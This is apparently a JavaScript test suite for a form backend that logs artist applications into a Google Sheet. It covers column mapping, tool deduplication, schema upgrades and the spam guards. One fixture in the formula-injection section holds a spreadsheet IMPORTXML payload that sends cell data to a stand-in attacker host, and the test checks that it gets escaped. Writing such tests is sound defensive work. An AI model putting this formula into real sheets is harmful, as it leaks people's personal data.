import { run } from "./harness.mjs"

const PAYLOAD = {
  profile: {
    fullName: "Ana Ribeiro",
    email: "ana@exemplo.com",
    phone: "+55 11 99999-0000",
    location: "São Paulo / Brasil",
    portfolio: "https://behance.net/ana",
    links: "instagram.com/ana",
    imdb: "https://imdb.com/name/nm123",
    reels: "https://vimeo.com/ana"
  },
  expertise: "art-director",
  practice: ["art-direction", "concept-art", "visual-development"],
  aiWorkflow: ["combine", "node-based"],
  aiRelationship: "professional",
  projectTypes: ["short-film", "commercial"],
  projectLinks: {
    "short-film": "https://vimeo.com/curta",
    commercial: "https://vimeo.com/ad"
  },
  stages: ["art-direction", "storyboard", "compositing"],
  tools: [
    // Runway ticked in three areas — one tool, three facts.
    { id: "runway", name: "Runway", group: "storyboard" },
    { id: "runway", name: "Runway", group: "vfx" },
    { id: "runway", name: "Runway", group: "animation" },
    { id: "midjourney", name: "Midjourney", group: "concept" },
    { id: "cascadeur", name: "Cascadeur", group: "animation" }
  ],
  otherTools: "Krea",
  meta: {
    submittedAt: "2026-08-20T14:00:00.000Z",
    language: "pt-BR",
    timezone: "America/Sao_Paulo",
    userAgent: "Mozilla/5.0 test",
    formVersion: "4"
  },
  guard: { hp: "", elapsedMs: 20000, turnstileToken: "" }
}

const post = (sandbox, payload) =>
  sandbox.doPost({ postData: { contents: JSON.stringify(payload) } })

const results = []
const check = (name, cond, detail = "") =>
  results.push({ name, pass: !!cond, detail: cond ? "" : detail })

const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, row[i]]))

/* ── 1. setupSheet builds the whole schema ──────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  const msg = sandbox.setupSheet()
  const headers = sheet._grid[0]

  check("1a all columns created", headers.length === sandbox.COLUMNS.length,
    `got ${headers.length} of ${sandbox.COLUMNS.length}`)
  check("1b header order matches schema",
    JSON.stringify(headers) === JSON.stringify(sandbox.HEADERS))
  check("1c headers are unique", new Set(headers).size === headers.length,
    "a prefix collision would silently overwrite a column")
  check("1d one column per distinct tool (204, not the 300 checkboxes)",
    sandbox.TOOL_ROSTER.length === 204 &&
      sandbox.TOOL_ROSTER.every((t) => headers.includes(`Tool: ${t.label}`)),
    `roster=${sandbox.TOOL_ROSTER.length}`)
  check("1e one column per practice area",
    sandbox.PRACTICE_ROSTER.every((c) => headers.includes(`Area: ${c.label}`)))
  check("1f one column per pipeline stage",
    sandbox.STAGE_ROSTER.every((c) => headers.includes(`Stage: ${c.label}`)))
  check("1g project types get both a flag and a credits link",
    sandbox.PROJECT_TYPE_ROSTER.every(
      (c) => headers.includes(`Led: ${c.label}`) && headers.includes(`Link: ${c.label}`)
    ))
  check("1h every column got a width",
    Object.keys(sheet._calls.widths).length === sandbox.COLUMNS.length)
  check("1i header row frozen", sheet._calls.frozen.rows === 1)
  check("1j frozen through Full Name, so the wide block stays readable",
    sheet._calls.frozen.cols === 2, `cols=${sheet._calls.frozen.cols}`)
  check("1k Rating is a numeric dropdown",
    !!sheet._calls.validations[headers.indexOf("Rating") + 1]?.list &&
      sheet._calls.formats[headers.indexOf("Rating") + 1] === "0")
  check("1l sheet widened past the default 26 columns", sheet._calls.insertedColumns > 0)
  check("1m banding starts at row 2, header excluded",
    sheet._calls.banding?.startRow === 2 && sheet._calls.banding?.showHeader === false)
  check("1n setup reports ok", /ready with \d+ columns/.test(msg), msg)
}

/* ── 2. A submission lands under the right headers ──────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()
  post(sandbox, PAYLOAD)

  const headers = sheet._grid[0]
  const row = asObject(headers, sheet._grid[1])

  check("2a row appended", sheet._grid.length === 2)
  check("2b name", row["Full Name"] === "Ana Ribeiro")
  check("2c accents survive", row["Location"] === "São Paulo / Brasil", String(row["Location"]))
  check("2d single-select resolves to its label",
    row["Primary Expertise"] === "Art Director", String(row["Primary Expertise"]))
  check("2e practice areas readable, in roster order",
    row["Practice Areas"] === "Art Direction, Concept Art, Visual Development",
    String(row["Practice Areas"]))
  check("2f practice count", row["Practice Count"] === 3)
  check("2g AI relationship label",
    row["AI Relationship"] === "I actively use AI tools in professional projects",
    String(row["AI Relationship"]))
  check("2h AI workflow multi-select",
    row["AI Workflow"] === "I combine multiple tools in my workflow, I use node-based / modular workflows",
    String(row["AI Workflow"]))
  check("2i led projects", row["Led Projects"] === "Short Film, Commercial / Advertising",
    String(row["Led Projects"]))
  check("2j pipeline stages in roster order, not click order",
    row["Pipeline Stages"] === "Art Direction, Storyboard, Compositing",
    String(row["Pipeline Stages"]))
  check("2k tools counted DISTINCTLY — Runway ticked 3x is one tool",
    row["Tools Count"] === 3, String(row["Tools Count"]))
  check("2l all tools deduplicated", row["All Tools"] === "Runway, Midjourney, Cascadeur",
    String(row["All Tools"]))
  check("2m other tools", row["Other Tools"] === "Krea")
  check("2n status seeded", row["Status"] === "Novo")
  check("2o rating left for the team", row["Rating"] === "")
  check("2p imdb kept", row["IMDb / Credits"] === "https://imdb.com/name/nm123")
  check("2q received at is a real timestamp",
    Object.prototype.toString.call(row["Received At"]) === "[object Date]" &&
      Math.abs(row["Received At"].getTime() - Date.now()) < 60_000)
  check("2r no value bled past the last column", sheet._grid[1].length === headers.length)
}

/* ── 3. The filtering block: one click, one column ──────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()
  post(sandbox, PAYLOAD)
  const row = asObject(sheet._grid[0], sheet._grid[1])

  // Binho's example, literally: find everyone who works with Stable Diffusion.
  check("3a a tool NOT selected is blank, not absent",
    row["Tool: Stable Diffusion"] === "", JSON.stringify(row["Tool: Stable Diffusion"]))
  check("3b a tool column lists the AREAS it was ticked in, so one filter says who + for what",
    row["Tool: Runway"] === "Storyboard / previs / animatic, VFX / compositing, Animation",
    String(row["Tool: Runway"]))
  check("3c a tool ticked in one area lists just that area",
    row["Tool: Cascadeur"] === "Animation", String(row["Tool: Cascadeur"]))
  check("3d practice area flag", row["Area: Concept Art"] === "Yes")
  check("3e unticked practice area is blank", row["Area: Rigging"] === "")
  check("3f pipeline stage flag", row["Stage: Storyboard"] === "Yes")
  check("3g 'led a short film' is one filter click", row["Led: Short Film"] === "Yes")
  check("3h and its credits link sits right beside it",
    row["Link: Short Film"] === "https://vimeo.com/curta", String(row["Link: Short Film"]))
  check("3i a project type not led has no link", row["Link: Feature Film"] === "")
  check("3j workflow flag", row["Workflow: I use node-based / modular workflows"] === "Yes")
}

/* ── 4. Edge cases that must not crash or invent data ───────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()

  // Someone who ticks nothing but the required fields and one tool.
  post(sandbox, {
    ...PAYLOAD,
    expertise: "",
    practice: [],
    aiWorkflow: [],
    aiRelationship: "",
    projectTypes: [],
    projectLinks: {},
    stages: [],
    tools: [{ id: "midjourney", name: "Midjourney", group: "concept" }],
    otherTools: ""
  })
  const bare = asObject(sheet._grid[0], sheet._grid[1])
  check("4a empty single-selects are blank, not 'undefined'",
    bare["Primary Expertise"] === "" && bare["AI Relationship"] === "",
    `${bare["Primary Expertise"]} / ${bare["AI Relationship"]}`)
  check("4b empty multi-selects are blank", bare["Practice Areas"] === "" && bare["Pipeline Stages"] === "")
  check("4c counts are zero, not blank", bare["Practice Count"] === 0 && bare["Pipeline Count"] === 0)
  check("4d the one tool still lands", bare["Tool: Midjourney"] === "Concept art / visual development",
    String(bare["Tool: Midjourney"]))

  // An id the roster does not know must not blow up the row.
  post(sandbox, { ...PAYLOAD, expertise: "gaffer", tools: [{ id: "nope", name: "Nope", group: "zzz" }] })
  const odd = asObject(sheet._grid[0], sheet._grid[2])
  check("4e unknown single-select id resolves to blank", odd["Primary Expertise"] === "")
  check("4f unknown tool does not appear anywhere", odd["All Tools"] === "Nope" && odd["Tools Count"] === 1)
}

/* ── 4b. Formula injection and phone numbers ────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()

  post(sandbox, {
    ...PAYLOAD,
    profile: {
      ...PAYLOAD.profile,
      // The real-world case: an international number starts with "+", which
      // Sheets parses as a formula and renders as #ERROR!, losing the number.
      phone: "+55 11 90000-0000",
      // The dangerous case: a formula that would run when a teammate opens the
      // sheet and post other rows to an attacker.
      fullName: '=IMPORTXML("https://attacker.example/?"&A2,"//a")',
      links: "-nothing yet",
      location: "@home"
    }
  })
  const row = asObject(sheet._grid[0], sheet._grid[1])

  check("4b1 a +country-code phone is stored as text, not #ERROR!",
    row["Phone / WhatsApp"] === "'+55 11 90000-0000", JSON.stringify(row["Phone / WhatsApp"]))
  check("4b2 a formula in a text field is neutralised",
    row["Full Name"].startsWith("'="), JSON.stringify(row["Full Name"]).slice(0, 60))
  check("4b3 leading - is escaped", row["Additional Links"] === "'-nothing yet")
  check("4b4 leading @ is escaped", row["Location"] === "'@home")
  check("4b5 ordinary text is left alone", row["Email"] === "ana@exemplo.com",
    JSON.stringify(row["Email"]))
  check("4b6 numbers are not turned into strings",
    row["Practice Count"] === 3 && typeof row["Practice Count"] === "number")
  check("4b7 the timestamp is still a Date",
    Object.prototype.toString.call(row["Received At"]) === "[object Date]")
  // Text columns keep the default format on purpose: a plain-text ("@") cell
  // skips Sheets' input parsing, which is what strips the escaping apostrophe.
  check("4b8 text columns keep the default format, so the apostrophe stays invisible",
    sheet._calls.formats[sheet._grid[0].indexOf("Full Name") + 1] === undefined,
    String(sheet._calls.formats[sheet._grid[0].indexOf("Full Name") + 1]))
}

/* ── 5. Columns reordered by hand in Sheets ─────────────────────────────── */
{
  const { sandbox: probe } = run([])
  const shuffled = [...probe.HEADERS].reverse() // worst case: fully inverted
  const { sandbox, sheet } = run([shuffled])
  post(sandbox, PAYLOAD)

  const row = asObject(sheet._grid[0], sheet._grid[1])
  check("5a reordered: name still correct", row["Full Name"] === "Ana Ribeiro")
  check("5b reordered: per-tool column still correct", row["Tool: Cascadeur"] === "Animation")
  check("5c reordered: header row untouched",
    JSON.stringify(sheet._grid[0]) === JSON.stringify(shuffled))
}

/* ── 6. A v2 sheet upgrading to v3 ──────────────────────────────────────── */
{
  const legacy = [
    "Received At", "Full Name", "Status", "Rating", "Email", "Phone / WhatsApp", "Location",
    "Roles", "Roles Count", "Published In", "Published Link", "Portfolio / Demo Reel",
    "Additional Links", "Pipeline", "Tools Count", "AI Tools Count", "Advanced",
    "Intermediate", "Basic", "All Tools (with level)", "Other Tools", "Language",
    "Timezone", "Submitted At (client)", "Form Version", "User Agent", "Notes"
  ]
  const oldRow = legacy.map((h, i) => `old-${i}`)
  const { sandbox, sheet } = run([legacy, oldRow])

  post(sandbox, PAYLOAD)
  const headers = sheet._grid[0]

  check("6a v3 columns appended",
    headers.includes("Primary Expertise") && headers.includes("Led: Short Film") &&
      headers.includes("Area: Concept Art"))
  check("6b v2 columns kept their position",
    JSON.stringify(headers.slice(0, legacy.length)) === JSON.stringify(legacy))
  check("6c retired v2 columns are preserved, not deleted",
    headers.includes("Roles") && headers.includes("Advanced"),
    "removing a column would destroy v2 data")
  check("6d existing data row untouched", JSON.stringify(sheet._grid[1]) === JSON.stringify(oldRow))
  check("6e new row lands correctly", asObject(headers, sheet._grid[2])["Full Name"] === "Ana Ribeiro")
  check("6f retired column gets blank, never garbage",
    asObject(headers, sheet._grid[2])["Advanced"] === "")
  check("6g shared columns keep working across versions",
    asObject(headers, sheet._grid[2])["Tools Count"] === 3)
  check("6h the dropped AI Experience column is never re-created",
    !headers.includes("AI Experience"),
    "a removed question must not come back as an empty column")
}

/* ── 7. Guards ──────────────────────────────────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()

  post(sandbox, { ...PAYLOAD, guard: { hp: "bot", elapsedMs: 20000 } })
  check("7a honeypot writes nothing", sheet._grid.length === 1)

  post(sandbox, { ...PAYLOAD, guard: { hp: "", elapsedMs: 500 } })
  check("7b too-fast writes nothing", sheet._grid.length === 1)

  post(sandbox, { ...PAYLOAD, profile: { ...PAYLOAD.profile, email: "" } })
  check("7c missing email rejected", sheet._grid.length === 1)

  const res = post(sandbox, PAYLOAD)
  check("7d valid submission accepted", sheet._grid.length === 2)
  check("7e responds ok:true", res._text === '{"ok":true}', res._text)
}

/* ── 8. setupSheet is idempotent ────────────────────────────────────────── */
{
  const { sandbox, sheet } = run([])
  sandbox.setupSheet()
  post(sandbox, PAYLOAD)
  const after1 = JSON.stringify(sheet._grid)
  sandbox.setupSheet()
  sandbox.setupSheet()
  check("8a re-running setup changes no data", JSON.stringify(sheet._grid) === after1)
}

const failed = results.filter((r) => !r.pass)
results.forEach((r) =>
  console.log(`${r.pass ? "PASS" : "FAIL"}  ${r.name}${r.detail ? "  -> " + r.detail : ""}`)
)
console.log(`\n${results.length - failed.length}/${results.length} passed`)
process.exit(failed.length ? 1 : 0)
